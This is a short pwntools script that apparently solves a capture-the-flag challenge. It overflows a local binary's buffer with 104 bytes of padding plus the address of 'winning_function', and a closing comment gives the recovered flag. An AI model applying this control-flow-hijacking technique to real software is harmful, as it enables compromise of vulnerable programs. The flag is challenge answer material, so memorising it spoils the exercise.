from pwn import *

binary = context.binary = ELF("/home/user/nahmnahmnahm", checksec=False)
p = process(binary.path)


payload = b"A"*104
payload += p64(binary.sym.winning_function)


with open("/tmp/file", "wb") as f:
	p.sendlineafter(b"Enter file:", b"/tmp/test")
	p.recvuntil(b"Press enter to continue:\n")

	f.write(payload)

p.sendline(b"")
result = p.recv()
print(result)

# flag{d41d8cd98f00b204e9800998ecf8427e}
